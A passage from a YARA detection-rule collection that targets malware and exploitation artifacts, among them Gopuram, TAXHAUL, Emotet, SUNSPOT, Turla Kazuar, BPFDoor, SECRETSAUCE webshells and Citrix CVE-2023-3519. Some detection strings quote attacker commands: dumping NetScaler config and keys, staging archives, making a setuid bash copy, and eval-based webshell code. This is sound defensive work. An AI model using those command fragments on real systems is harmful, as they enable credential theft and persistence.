		$op2 = { B9 49 F7 02 78 4C 8B E8 E8 ?? ?? ?? ?? B9 58 A4 53 E5 48 89 44 24 ?? E8 ?? ?? ?? ?? B9 10 E1 8A C3 48 8B F0 E8 ?? ?? ?? ?? B9 AF B1 5C 94 48 89 44 24 ?? E8 }

	condition:
		all of them
}

rule SIGNATURE_BASE_APT_MAL_Gopuram_Backdoor_Apr23 : FILE
{
	meta:
		description = "Detects Gopuram backdoor"
		author = "X__Junior (Nextron Systems)"
		id = "3ae5ddcb-5601-5dca-85dd-0a4772577fae"
		date = "2023-02-24"
		modified = "2023-12-05"
		reference = "https://securelist.com/gopuram-backdoor-deployed-through-3cx-supply-chain-attack/109344/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_mal_gopuram_apr23.yar#L20-L41"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "beb775af5196f30e0ee021790a4978ca7a7ac2a7cf970a5a620ffeb89cc60b2c"
		hash = "97b95b4a5461f950e712b82783930cb2a152ec0288c00a977983ca7788342df7"
		logic_hash = "aa3dd1f35d27d23eb775410cceae81d5b767dc0f1636aac67f2d2e988a3ed995"
		score = 80
		quality = 85
		tags = "FILE"

	strings:
		$x1 = "%s\\config\\TxR\\%s.TxR.0.regtrans-m" ascii
		$xop = { D1 E8 33 C3 D1 EB A8 01 74 ?? 81 F3 25 A3 87 DE D1 E8 33 C3 D1 EB A8 01 74 ?? 81 F3 25 A3 87 DE D1 E8 33 C3 D1 EB A8 01 74 ?? 81 F3 25 A3 87 DE D1 E8 33 C3 D1 EB A8 01 74 ?? 81 F3 25 A3 87 DE }
		$opa1 = { 48 89 44 24 ?? 45 33 C9 45 33 C0 33 D2 89 5C 24 ?? 48 89 74 24 ?? 48 89 5C 24 ?? 89 7C 24 ?? FF 15 ?? ?? ?? ?? 85 C0 74 ?? 48 8B 4C 24 ?? 4C 8D 4C 24 ?? 44 8D 43 }
		$opa2 = { 48 89 B4 24 ?? ?? ?? ?? 44 8D 43 ?? 33 D2 48 89 BC 24 ?? ?? ?? ?? 4C 89 B4 24 ?? ?? ?? ?? E8 ?? ?? ?? ?? 48 8B 4C 24 ?? E8 ?? ?? ?? ?? 48 8B 4C 24 ?? 45 33 C0 33 D2 8B F8 E8 ?? ?? ?? ?? 8D 4F ?? E8 ?? ?? ?? ?? 4C 8B 4C 24 ?? 44 8D 43 ?? 48 8B C8 8B D7 48 8B F0 44 8B F7 E8 ?? ?? ?? ?? 48 8B 4C 24 ?? E8  }

	condition:
		( uint16( 0 ) == 0x5A4D and filesize < 2MB and pe.characteristics & pe.DLL and 1 of ( $x* ) ) or all of ( $opa* )
}
rule SIGNATURE_BASE_APT_NK_MAL_DLL_Apr23_1 : FILE
{
	meta:
		description = "Detects DLLs loaded by shellcode loader (6ce5b6b4cdd6290d396465a1624d489c7afd2259a4d69b73c6b0ba0e5ad4e4ad) (relation to Lazarus group)"
		author = "Florian Roth (Nextron Systems)"
		id = "c2abe266-0c21-51aa-9426-46a4f59df937"
		date = "2023-04-03"
		modified = "2023-12-05"
		reference = "https://securelist.com/gopuram-backdoor-deployed-through-3cx-supply-chain-attack/109344/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_mal_gopuram_apr23.yar#L43-L75"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "69dd140f45c3fa3aaa64c69f860cd3c74379dec37c46319d7805a29b637d4dbf"
		hash = "bb1066c1ca53139dc5a2c1743339f4e6360d6fe4f2f3261d24fc28a12f3e2ab9"
		hash = "dca33d6dacac0859ec2f3104485720fe2451e21eb06e676f4860ecc73a41e6f9"
		hash = "fe948451df90df80c8028b969bf89ecbf501401e7879805667c134080976ce2e"
		logic_hash = "e0a8f3896c0119ce399e83fe3e565c66144693e84996aa3d01ca1b6315521782"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$x1 = "vG2eZ1KOeGd2n5fr" ascii fullword
		$s1 = "Windows %d(%d)-%s" ascii fullword
		$s2 = "auth_timestamp: " ascii fullword
		$s3 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36" wide fullword
		$op1 = { b8 c8 00 00 00 83 fb 01 44 0f 47 e8 41 8b c5 48 8b b4 24 e0 18 00 00 4c 8b a4 24 e8 18 00 00 48 8b 8d a0 17 00 00 48 33 cc }
		$op2 = { 33 d2 46 8d 04 b5 00 00 00 00 66 0f 1f 44 00 00 49 63 c0 41 ff c0 8b 4c 84 70 31 4c 94 40 48 ff c2 }
		$op3 = { 89 5c 24 50 0f 57 c0 c7 44 24 4c 04 00 00 00 c7 44 24 48 40 00 00 00 0f 11 44 24 60 0f 11 44 24 70 0f 11 45 80 0f 11 45 90 }

	condition:
		uint16( 0 ) == 0x5a4d and filesize < 500KB and ( 1 of ( $x* ) or 2 of them ) or ( $x1 and 1 of ( $s* ) or 3 of them )
}
rule SIGNATURE_BASE_APT_UNC4736_NK_MAL_TAXHAUL_3CX_Apr23_1 : FILE
{
	meta:
		description = "Detects TAXHAUL (AKA TxRLoader) malware used in the 3CX compromise by UNC4736"
		author = "Mandiant"
		id = "25a80f98-03d6-59e6-84e6-6d847a6c591e"
		date = "2023-03-04"
		modified = "2023-12-05"
		reference = "https://www.3cx.com/blog/news/mandiant-initial-results/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_mal_gopuram_apr23.yar#L77-L90"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "f67af611d0b3d96e4aaf7b3b5e49c1fb536e61a430b79ac0a0560ef3773ba140"
		score = 80
		quality = 85
		tags = "FILE"

	strings:
		$p00_0 = {410f45fe4c8d3d[4]eb??4533f64c8d3d[4]eb??4533f64c8d3d[4]eb}
		$p00_1 = {4d3926488b01400f94c6ff90[4]41b9[4]eb??8bde4885c074}

	condition:
		uint16( 0 ) == 0x5A4D and any of them
}

rule SIGNATURE_BASE_MAL_Emotet_Jan20_1 : FILE
{
	meta:
		description = "Detects Emotet malware"
		author = "Florian Roth (Nextron Systems)"
		id = "334ae7e5-0a46-5e95-bf53-0f343db4e4de"
		date = "2020-01-29"
		modified = "2023-12-05"
		reference = "https://app.any.run/tasks/5e81638e-df2e-4a5b-9e45-b07c38d53929/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/crime_emotet.yar#L20-L37"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "e7c22ccdb1103ee6bd15c528270f56913bb2f47345b360802b74084563f1b73d"
		logic_hash = "23ffcdde3eae7637e5b47a0f940cbebafccfd4c3f222b882e73d7d02447b83c3"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$op0 = { 74 60 8d 34 18 eb 54 03 c3 50 ff 15 18 08 41 00 }
		$op1 = { 03 fe 66 39 07 0f 85 2a ff ff ff 8b 4d f0 6a 20 }
		$op2 = { 8b 7d fc 0f 85 49 ff ff ff 85 db 0f 84 d1 }

	condition:
		uint16( 0 ) == 0x5a4d and filesize <= 200KB and ( pe.imphash ( ) == "009889c73bd2e55113bf6dfa5f395e0d" or 1 of them )
}
rule SIGNATURE_BASE_MAL_Emotet_BKA_Quarantine_Apr21
{
	meta:
		description = "No description has been set in the source file - Signature Base"
		author = "press inquiries <info@bka.de>, technical contact <info@mha.bka.de>"
		id = "22c27d82-00cb-5d2f-a1cc-9f8b4c60aecd"
		date = "2021-03-23"
		modified = "2023-12-05"
		reference = "https://www.bka.de/DE/IhreSicherheit/RichtigesVerhalten/StraftatenImInternet/FAQ/FAQ_node.html"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/crime_emotet.yar#L39-L52"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "cc75be5f641e21446a41bf9cc855330a612847e7e3a3be935577d33195f40d05"
		score = 75
		quality = 85
		tags = ""
		descripton = "The modified emotet binary replaces the original emotet on the system of the victim. The original emotet is copied to a quarantine for evidence-preservation."
		note = "The quarantine folder depends on the scope of the initial emotet infection (user or administrator). It is the temporary folder as returned by GetTempPathW under a filename starting with UDP as returned by GetTempFileNameW. To prevent accidental reinfection by a user, the quarantined emotet is encrypted using RC4 and a 0x20 bytes long key found at the start of the quarantined file (see $key)."
		sharing = "TLP:WHITE"

	strings:
		$key = { c3 da da 19 63 45 2c 86 77 3b e9 fd 24 64 fb b8 07 fe 12 d0 2a 48 13 38 48 68 e8 ae 91 3c ed 82 }

	condition:
		$key at 0
}
rule SIGNATURE_BASE_MAL_Emotet_BKA_Cleanup_Apr21 : FILE
{
	meta:
		description = "No description has been set in the source file - Signature Base"
		author = "press inquiries <info@bka.de>, technical contact <info@mha.bka.de>"
		id = "10d93918-8a5e-54a3-81c6-f6ff68562e13"
		date = "2021-03-23"
		modified = "2023-12-05"
		reference = "https://www.bka.de/DE/IhreSicherheit/RichtigesVerhalten/StraftatenImInternet/FAQ/FAQ_node.html"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/crime_emotet.yar#L54-L70"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "533adaed96d015ea2dcd54d5aaf9e71b5b70430ed5733a98618925cf978a6515"
		score = 75
		quality = 85
		tags = "FILE"
		descripton = "This rule targets a modified emotet binary deployed by the Bundeskriminalamt on the 26th of January 2021."
		note = "The binary will replace the original emotet by copying it to a quarantine. It also contains a routine to perform a self-deinstallation on the 25th of April 2021. The three-month timeframe between rollout and self-deinstallation was chosen primarily for evidence purposes as well as to allow remediation."
		sharing = "TLP:WHITE"

	strings:
		$key = { c3 da da 19 63 45 2c 86 77 3b e9 fd 24 64 fb b8 07 fe 12 d0 2a 48 13 38 48 68 e8 ae 91 3c ed 82 }

	condition:
		filesize > 300KB and filesize < 700KB and uint16( 0 ) == 0x5A4D and $key
}
rule SIGNATURE_BASE_EXPL_Citrix_Netscaler_ADC_Forensicartifacts_CVE_2023_3519_Jul23_2 : CVE_2023_3519 FILE
{
	meta:
		description = "Detects forensic artifacts found after an exploitation of Citrix NetScaler ADC CVE-2023-3519"
		author = "Florian Roth"
		id = "471ce547-0133-5836-b9d1-02c932ecfd1e"
		date = "2023-07-21"
		modified = "2023-12-05"
		reference = "https://www.cisa.gov/sites/default/files/2023-07/aa23-201a_csa_threat_actors_exploiting_citrix-cve-2023-3519_to_implant_webshells.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/expl_citrix_netscaler_adc_exploitation_cve_2023_3519.yar#L27-L41"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "48d4225d0935084003f7a98c554d7c4722a91290dfe190001da52bce332b3f7d"
		score = 70
		quality = 85
		tags = "CVE-2023-3519, FILE"

	strings:
		$s1 = "tar -czvf - /var/tmp/all.txt" ascii fullword
		$s2 = "-out /var/tmp/test.tar.gz" ascii
		$s3 = "/test.tar.gz /netscaler/"

	condition:
		filesize < 10MB and 1 of them
}
rule SIGNATURE_BASE_EXPL_Citrix_Netscaler_ADC_Forensicartifacts_CVE_2023_3519_Jul23_3 : CVE_2023_3519 FILE
{
	meta:
		description = "Detects forensic artifacts found after an exploitation of Citrix NetScaler ADC CVE-2023-3519"
		author = "Florian Roth"
		id = "2f40b423-f1da-5711-ac4f-18de77cd52d0"
		date = "2023-07-24"
		modified = "2023-12-05"
		reference = "https://www.mandiant.com/resources/blog/citrix-zero-day-espionage"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/expl_citrix_netscaler_adc_exploitation_cve_2023_3519.yar#L43-L61"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "e78e1a788503b841ed0f4e5cd415eb35d8911092778120d7fd061ed20820da37"
		score = 70
		quality = 85
		tags = "CVE-2023-3519, FILE"

	strings:
		$x1 = "cat /flash/nsconfig/ns.conf >>" ascii
		$x2 = "cat /nsconfig/.F1.key >>" ascii
		$x3 = "openssl base64 -d < /tmp/" ascii
		$x4 = "cp /usr/bin/bash /var/tmp/bash" ascii
		$x5 = "chmod 4775 /var/tmp/bash"
		$x6 = "pwd;pwd;pwd;pwd;pwd;"
		$x7 = "(&(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(!(objectCategory=computer)))"

	condition:
		filesize < 10MB and 1 of them
}
rule SIGNATURE_BASE_LOG_EXPL_Citrix_Netscaler_ADC_Exploitation_Attempt_CVE_2023_3519_Jul23_1 : CVE_2023_3519
{
	meta:
		description = "This YARA rule detects forensic artifacts that appear following an attempted exploitation of Citrix NetScaler ADC CVE-2023-3519. The rule identifies an attempt to access the vulnerable function using an overly long URL, a potential sign of attempted exploitation. However, it does not confirm whether such an attempt was successful."
		author = "Florian Roth"
		id = "7dfe4130-d976-5d6d-a05d-ccadefe45406"
		date = "2023-07-27"
		modified = "2023-12-05"
		reference = "https://blog.assetnote.io/2023/07/24/citrix-rce-part-2-cve-2023-3519/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/expl_citrix_netscaler_adc_exploitation_cve_2023_3519.yar#L63-L77"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "7ad3164c5b2616b12a513a2bb3736d530769e75fca03346a72351a27b8343b2a"
		score = 65
		quality = 85
		tags = "CVE-2023-3519"

	strings:
		$sr1 = /GWTEST FORMS SSO: Parse=0; URLLEN=([2-9][0-9]{2}|[0-9]{4,20}); Event: start=0x/
		$s1 = ", type=1; Target: start=0x"

	condition:
		all of them
}
rule SIGNATURE_BASE_WEBSHELL_SECRETSAUCE_Jul23_1 : CVE_2023_3519 FILE
{
	meta:
		description = "Detects SECRETSAUCE PHP webshells (found after an exploitation of Citrix NetScaler ADC CVE-2023-3519)"
		author = "Florian Roth"
		id = "db0542e7-648e-5f60-9838-e07498f58b51"
		date = "2023-07-24"
		modified = "2023-12-05"
		reference = "https://www.mandiant.com/resources/blog/citrix-zero-day-espionage"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/expl_citrix_netscaler_adc_exploitation_cve_2023_3519.yar#L79-L100"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "c762d46ae43a3e10453c2ee17039812a06086ac85bdb000cf8308f5196a9dee2"
		score = 85
		quality = 85
		tags = "CVE-2023-3519, FILE"

	strings:
		$sa1 = "for ($x=0; $x<=1; $x++) {" ascii
		$sa2 = "$_REQUEST[" ascii
		$sa3 = "@eval" ascii
		$sb1 = "public $cmd;" ascii
		$sb2 = "return @eval($a);" ascii
		$sb3 = "$z->run($z->get('openssl_public_decrypt'));"

	condition:
		filesize < 100KB and ( all of ( $sa* ) or 2 of ( $sb* ) )
}

rule SIGNATURE_BASE_Apt_RU_Turla_Kazuar_Debugview_Pefeatures : FILE
{
	meta:
		description = "Turla mimicking SysInternals Tools- peFeatures"
		author = "JAG-S"
		id = "0a1675c0-8645-5288-9ef6-e68ffbfe0c3b"
		date = "2020-05-28"
		modified = "2023-12-05"
		reference = "https://www.epicturla.com/blog/sysinturla"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_turla_kazuar.yar#L15-L59"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "1749c96cc1a4beb9ad4d6e037e40902fac31042fa40152f1d3794f49ed1a2b5c"
		hash = "44cc7f6c2b664f15b499c7d07c78c110861d2cc82787ddaad28a5af8efc3daac"
		logic_hash = "10c2e47e5c1885c7dc19d1fb7933c9b15911cbe4c6fba99b7f763738ae934126"
		score = 85
		quality = 85
		tags = "FILE"
		version = "2.0"

	condition:
		uint16( 0 ) == 0x5a4d and ( pe.version_info [ "LegalCopyright" ] == "Test Copyright" and ( ( pe.version_info [ "ProductName" ] == "Sysinternals DebugView" and pe.version_info [ "Description" ] == "Sysinternals DebugView" ) or ( pe.version_info [ "FileVersion" ] == "4.80.0.0" and pe.version_info [ "Comments" ] == "Sysinternals DebugView" ) or ( pe.version_info [ "OriginalName" ] contains "DebugView.exe" and pe.version_info [ "InternalName" ] contains "DebugView.exe" ) or ( pe.version_info [ "OriginalName" ] == "Agent.exe" and pe.version_info [ "InternalName" ] == "Agent.exe" ) ) )
}
rule SIGNATURE_BASE_APT_MAL_RU_Turla_Kazuar_May20_1 : FILE
{
	meta:
		description = "Detects Turla Kazuar malware"
		author = "Florian Roth (Nextron Systems)"
		id = "cd0d1fa2-5303-55f8-90a7-4a699ec79230"
		date = "2020-05-28"
		modified = "2023-12-05"
		reference = "https://www.epicturla.com/blog/sysinturla"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_turla_kazuar.yar#L61-L81"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "1749c96cc1a4beb9ad4d6e037e40902fac31042fa40152f1d3794f49ed1a2b5c"
		hash = "1fca5f41211c800830c5f5c3e355d31a05e4c702401a61f11e25387e25eeb7fa"
		hash = "2d8151dabf891cf743e67c6f9765ee79884d024b10d265119873b0967a09b20f"
		hash = "44cc7f6c2b664f15b499c7d07c78c110861d2cc82787ddaad28a5af8efc3daac"
		logic_hash = "547ed3cd88057ab91a0804ecf515eacca04fcf6e490aed1ee0f6a26c3d6b8268"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$s1 = "Sysinternals" ascii fullword
		$s2 = "Test Copyright" wide fullword
		$op1 = { 0d 01 00 08 34 2e 38 30 2e 30 2e 30 00 00 13 01 }

	condition:
		uint16( 0 ) == 0x5a4d and filesize < 2000KB and all of them
}
rule SIGNATURE_BASE_WEBSHELL_ASPX_Mar21_1 : FILE
{
	meta:
		description = "Detects ASPX Web Shells"
		author = "Florian Roth (Nextron Systems)"
		id = "52884135-6b86-5e3e-a866-36a812d5a9af"
		date = "2021-03-12"
		modified = "2025-11-03"
		reference = "Internal Research"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/thor-webshells.yar#L9933-L9959"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "10b6e82125a2ddf3cc31a238e0d0c71a64f902e0d77171766713affede03174d"
		hash = "170bee832df176aac0a3c6c7d5aa3fee413b4572030a24c994a97e70f6648ffc"
		hash = "31c4d1fc81c052e269866deff324dffb215e7d481a47a2b6357a572a3e685d90"
		hash = "41b5c26ac194439612b68e9ec6a638eceaf00842c347ffa551eb009ef6c015a3"
		hash = "4b645bc773acde2b3cc204e77ac27c3f6991046c3b75f42d12bc90ec29cff9e3"
		hash = "602bb701b78895d4de32f5e78f3c511e5298ba244b29641b11a7c1c483789859"
		hash = "7ac47a17c511e25c06a53a1c7a5fbbf05f41f047a4a40b71afa81ce7b59f4b03"
		hash = "9a5097d0e8dc29a2814adac070c80fd4b149b33e56aaaf9235af9e87b0501d91"
		hash = "9efb5932c0753e45504fc9e8444209b92c2bdf22e63b1c1a44e2d52cb62b4548"
		hash = "d40b16307d6434c3281374c0e1bbc0f6db388883e7f6266c3c81de0694266882"
		logic_hash = "0c20163871bf424c0b594c4b75d35e782df03761552f792474761c603ddb8478"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$s1 = ".StartInfo.FileName = 'cmd.exe';" ascii
		$s2 = "<xsl:template match=\"\"/root\"\">" ascii fullword
		$s3 = "<?xml version=\"\"1.0\"\"?><root>test</root>\";" ascii fullword

	condition:
		uint16( 0 ) == 0x253c and filesize < 6KB and all of them
}
rule SIGNATURE_BASE_Crowdstrike_SUNSPOT_01 : ARTIFACT STELLARPARTICLE SUNSPOT FILE
{
	meta:
		description = "Detects RC4 and AES key encryption material in SUNSPOT"
		author = "(c) 2021 CrowdStrike Inc."
		id = "2a2a5cfc-d059-5942-bd70-c3169e9ceb45"
		date = "2021-01-08"
		modified = "2023-12-05"
		reference = "https://www.crowdstrike.com/blog/sunspot-malware-technical-analysis/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_sunspot.yar#L1-L21"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "660e955c22a9f02e952677f7a38da04e2ec369a1f68658bc261063e830dea180"
		score = 75
		quality = 85
		tags = "ARTIFACT, STELLARPARTICLE, SUNSPOT, STELLARPARTICLE, FILE"
		version = "202101081448"
		actor = "StellarParticle"
		malware_family = "SUNSPOT"

	strings:
		$key = {fc f3 2a 83 e5 f6 d0 24 a6 bf ce 88 30 c2 48 e7}
		$iv = {81 8c 85 49 b9 00 06 78 0b e9 63 60 26 64 b2 da}

	condition:
		all of them and filesize < 32MB
}
rule SIGNATURE_BASE_Crowdstrike_SUNSPOT_02 : ARTIFACT STELLARPARTICLE SUNSPOT FILE
{
	meta:
		description = "Detects mutex names in SUNSPOT"
		author = "(c) 2021 CrowdStrike Inc."
		id = "9ecb89e6-475b-5961-8a67-136a0274e1c7"
		date = "2021-01-08"
		modified = "2023-12-05"
		reference = "https://www.crowdstrike.com/blog/sunspot-malware-technical-analysis/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_sunspot.yar#L23-L43"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "b5a528e76108f721e0508f1a7182f00c04dc55ec9b0aaece30986828921dafcc"
		score = 75
		quality = 85
		tags = "ARTIFACT, STELLARPARTICLE, SUNSPOT, STELLARPARTICLE, FILE"
		version = "202101081448"
		actor = "StellarParticle"
		malware_family = "SUNSPOT"

	strings:
		$mutex_01 = "{12d61a41-4b74-7610-a4d8-3028d2f56395}" wide ascii
		$mutex_02 = "{56331e4d-76a3-0390-a7ee-567adf5836b7}" wide ascii

	condition:
		any of them and filesize < 10MB
}
rule SIGNATURE_BASE_Crowdstrike_SUNSPOT_03 : ARTIFACT LOGGING STELLARPARTICLE SUNSPOT FILE
{
	meta:
		description = "Detects log format lines in SUNSPOT"
		author = "(c) 2021 CrowdStrike Inc."
		id = "5535163e-a85a-587d-bb6e-083783f915c9"
		date = "2021-01-19"
		modified = "2021-01-08"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_sunspot.yar#L45-L88"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "ea701dc368af040e38fae8a076c96d95e167af70d5d71f3431184d20b0056373"
		score = 75
		quality = 83
		tags = "ARTIFACT, LOGGING, STELLARPARTICLE, SUNSPOT, STELLARPARTICLE, FILE"
		version = "202101081443"
		actor = "StellarParticle"
		malware_family = "SUNSPOT"

	strings:
		$s01 = "[ERROR] ***Step1('%ls','%ls') fails with error %#x***\x0A" ascii
		$s02 = "[ERROR] Step2 fails\x0A" ascii
		$s03 = "[ERROR] Step3 fails\x0A" ascii
		$s04 = "[ERROR] Step4('%ls') fails\x0A" ascii
		$s05 = "[ERROR] Step5('%ls') fails\x0A" ascii
		$s06 = "[ERROR] Step6('%ls') fails\x0A" ascii
		$s07 = "[ERROR] Step7 fails\x0A" ascii
		$s08 = "[ERROR] Step8 fails\x0A" ascii
		$s09 = "[ERROR] Step9('%ls') fails\x0A" ascii
		$s10 = "[ERROR] Step10('%ls','%ls') fails with error %#x\x0A" ascii
		$s11 = "[ERROR] Step11('%ls') fails\x0A" ascii
		$s12 = "[ERROR] Step12('%ls','%ls') fails with error %#x\x0A" ascii
		$s13 = "[ERROR] Step30 fails\x0A" ascii
		$s14 = "[ERROR] Step14 fails with error %#x\x0A" ascii
		$s15 = "[ERROR] Step15 fails\x0A" ascii
		$s16 = "[ERROR] Step16 fails\x0A" ascii
		$s17 = "[%d] Step17 fails with error %#x\x0A" ascii
		$s18 = "[%d] Step18 fails with error %#x\x0A" ascii
		$s19 = "[ERROR] Step19 fails with error %#x\x0A" ascii
		$s20 = "[ERROR] Step20 fails\x0A" ascii
		$s21 = "[ERROR] Step21(%d,%s,%d) fails\x0A" ascii
		$s22 = "[ERROR] Step22 fails with error %#x\x0A" ascii
		$s23 = "[ERROR] Step23 fails with error %#x\x0A" ascii
		$s24 = "[%d] Solution directory: %ls\x0A" ascii
		$s25 = "[%d] %04d-%02d-%02d %02d:%02d:%02d:%03d %ls\x0A" ascii
		$s26 = "[%d] + '%s' " ascii

	condition:
		2 of them and filesize < 10MB
}
rule SIGNATURE_BASE_HKTL_Bluehammer_Apr26 : FILE
{
	meta:
		description = "Detects Nightmare-Eclipse/BlueHammer (FunnyApp), a Windows local privilege escalation PoC that abuses a Defender signature-update RPC and a junction/symlink race to leak the SAM hive and derive NTLM hashes - giving an unprivileged user full SYSTEM-level credential access."
		author = "AzizFarghly (Nextron-Systems)"
		id = "595bf733-b287-5048-88e2-b88caffc7a5d"
		date = "2026-04-07"
		modified = "2026-05-15"
		reference = "https://github.com/Nightmare-Eclipse/BlueHammer"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/htkl_blue_hammer_tool.yar#L1-L35"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "6514f56223999eb86a19ea9f2abbfb0f407934a1a0694ffb94a8ea37113073f4"
		hash = "93008c42764b74b759678fd376abd90696f74af408600727b6649286d8424270"
		hash = "b25e903988e530df00658ff3ad6d180e43d6660b705ad6d0def4a29ee1167e52"
		hash = "82eb727e2a2b3334a70fa2d357ba4f44dc989a650a6a18222dd5d1bb1444b496"
		hash = "b33f3f31c83fc655952fab73d72b673b92ed4f205daee56444903201316cfc4a"
		hash = "c6baa5ec9ea2c2802a90acad5a53453d176a02e04a31ac8e9b7b34b5e3329b84"
		hash = "552dba31a446e96416738d84d4366503c397ba508a732719531c89a41abf3704"
		hash = "c9bec499db6a0a2165bcd2a211c8887e5fadf954eb9a2e5d3c6ca833e4a5ef64"
		logic_hash = "fa5f566895d158f1ae07f282fc19516792e620855a9485026ab05f359c48f670"
		score = 90
		quality = 85
		tags = "FILE"

	strings:
		$x1 = "Junction created %ws => %ws"
		$x2 = "connect to windows defender RPC port !!!"
		$s1 = "\\System32\\Config\\SAM" wide
		$s2 = "IMpService77BDAF73-B396-481F-9042-AD358843EC24" wide
		$s3 = "ServerMpUpdateEngineSignature"
		$op1 = { 8D 47 02 66 89 43 0C 66 C7 43 0E 02 00 48 8B C7 48 D1 E8 66 44 89 7C 43 12 }

	condition:
		uint16( 0 ) == 0x5A4D and filesize < 7MB and ( 1 of ( $x* ) or all of ( $s* ) or $op1 ) or 3 of them
}
rule SIGNATURE_BASE_MAL_LNX_Redmenshen_Bpfdoor_May23_1 : FILE
{
	meta:
		description = "Detects BPFDoor malware"
		author = "Florian Roth"
		id = "25df4dba-ec6e-5999-b6be-56fe933cb0d0"
		date = "2023-05-11"
		modified = "2023-12-05"
		reference = "https://www.deepinstinct.com/blog/bpfdoor-malware-evolves-stealthy-sniffing-backdoor-ups-its-game"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/mal_lnx_implant_may22.yar#L3-L42"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "afa8a32ec29a31f152ba20a30eb483520fe50f2dce6c9aa9135d88f7c9c511d7"
		logic_hash = "c58971a43443800256e791b4f9fe7c3221518b0050e5f2964b6c843ddb4549ac"
		score = 80
		quality = 85
		tags = "FILE"

	strings:
		$x1 = "[-] Execute command failed" ascii fullword
		$x2 = "/var/run/initd.lock" ascii fullword
		$xc1 = { 2F 00 3E 3E 00 65 78 69 74 00 72 00 }
		$sc1 = { 9F CD 30 44 }
		$sc2 = { 66 27 14 5E }
		$sa1 = "TLS-CHACHA20-POLY1305-SHA256" ascii fullword
		$sop1 = { 48 83 c0 01 4c 39 f8 75 ea 4c 89 7c 24 68 48 69 c3 d0 00 00 00 48 8b 5c 24 50 48 8b 54 24 78 48 c7 44 24 38 00 00 00 00 }
		$sop2 = { 48 89 de f3 a5 89 03 8b 44 24 2c 39 44 24 28 44 89 4b 04 48 89 53 10 0f 95 c0 }
		$sop3 = { 49 d3 cd 4d 31 cd b1 29 49 89 e9 49 d3 c8 4d 31 c5 4c 03 68 10 48 89 f9 }

	condition:
